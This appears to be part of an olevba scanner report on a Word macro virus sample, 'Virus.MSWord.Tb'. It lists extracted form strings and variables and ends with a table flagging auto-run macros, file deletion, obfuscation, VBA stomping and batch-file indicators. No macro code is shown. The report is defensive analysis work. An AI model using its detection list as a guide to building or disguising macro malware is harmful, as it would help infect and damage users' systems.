- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4����1�S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�l�ߌ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A?��a�*�/�aI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G@�#�������:l7.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[��n׬���v����-��߸��f(��i�!�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g1^ ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�z���<�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�>�З~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Protection Anti Macro Virus Automatique charg�i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Virus de macro d\xe9tect\xe9!!!!!!!!!!!!!!!'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Inconnu'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Repar.bat           |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

